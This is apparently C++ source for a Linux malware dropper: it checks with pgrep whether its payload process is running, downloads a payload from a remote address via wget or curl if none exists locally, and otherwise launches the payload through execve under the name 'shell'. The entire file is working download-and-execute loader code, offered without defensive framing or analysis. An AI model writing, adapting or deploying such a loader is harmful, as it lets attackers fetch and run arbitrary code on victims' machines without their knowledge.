#include "dropper.h"
#define die(e) do { fprintf(stderr, "%s\n", e); exit(EXIT_FAILURE); } while (0);

int Start()
{
	fprintf(stdout, "[Dropper called]");

	if(ProcessRunning(_ProcName))
	{
		fputs("[Process already running]\n", stdout);
		return 0;
	}
	else
	{
		bool payloadExists = FileExists(_PayloadLocal);
		
		fputs(payloadExists ? "[Payload Exists]\n" : "[Doesn't Exist]\n", stdout);

		if(!payloadExists)
		{
			fputs("[Downloading...]\n", stdout);
			Download();
		}
		else
		{
			Execute(_PayloadLocal);
		}
	}

	return 0;
}

//NOTE Only checks for accessibility, not existance.
bool FileExists(std::string name)
{
	struct stat buffer;
	return (stat (name.c_str(), &buffer) == 0);
}

bool ProcessRunning(std::string processName)
{
	int result;
	int link[2];
	pid_t pid;
	char foo[4096];

	if(pipe(link) == -1)
		die("pipe");

	if((pid = fork()) == -1)
		die("fork");

	if(pid == 0)
	{
		dup2(link[1], STDOUT_FILENO);
		close(link[0]);
		close(link[1]);

		char* argv[] = { (char*)"pgrep", (char*) "-f",(char*)processName.c_str(), (char*)0};
		execve("/usr/bin/pgrep", argv, NULL);
		die("execve");
	}
	else
	{
		close(link[1]);
		result = read(link[0], foo, sizeof(foo));
		printf("\n[PID] %.*s", result, foo);
	}

	return (result != 0);
}


void WriteToFile()
{
	// Save PID to file.
	if(fork() == 0)
	{
		int fd = open("/tmp/text.txt", O_RDWR | O_CREAT, 0666);

		// Redirect STD_O/STD_E to text file file descriptor.
		dup2(fd, 1);
		dup2(fd, 2);

		close(fd);

		// Execute pgrep for our process
		char* argv[] = { (char*)"pgrep", (char*)_ProcName.c_str(), (char*)0};
		execve("/usr/bin/pgrep", argv, NULL);
	}
}

void Download()
{
	// Webclients path
	std::vector<const char*> webclients = 
	{
		"/usr/bin/wget",
		"/usr/bin/curl"
	};


	// Try to download using an existing webclient
	for(size_t i = 0; i < webclients.size(); i++)
	{
		if(FileExists(webclients[i]))
		{
				//std::cout << "Found webclient: " << webclients[i] << std::endl;
				
				int pid = fork();

				if(pid == 0)
				{
					execl(webclients[i], "wget", 
										 (i == 0) ? "-q" : "-sS",
										 (i == 0) ? "-o" : "",
										 (i == 0) ? "/dev/null" : "",
										 (i == 0) ? "-O" : "-o",
										 _PayloadLocal.c_str(), 
										 _PayloadRemote.c_str(),
										 NULL);
				}

				break;
		}
	}
}

void Execute(std::string binary)
{
	char* argv[] = { (char*)"shell", (char*)0 };

	if(fork() == 0)
	{
		execve(_PayloadLocal.c_str(), argv, NULL);
	}

	fputs("[End of control flow]\n", stdout);
}
